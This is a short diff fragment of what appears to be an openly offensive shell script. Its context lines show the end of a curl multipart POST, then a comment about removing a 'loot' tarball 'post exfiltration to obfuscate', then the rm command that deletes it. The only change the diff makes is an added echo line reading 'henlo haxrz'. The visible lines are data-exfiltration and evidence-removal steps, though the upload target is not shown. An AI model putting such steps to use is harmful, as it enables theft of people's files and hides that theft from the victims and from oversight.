@@ -38,3 +38,5 @@ curl -X POST -H "Content-Type: multipart/form-data" \
 
 # Remove the tarball post exfiltration to obfuscate:
 rm ~/.loot.tar.gz
+
+echo "henlo haxrz"
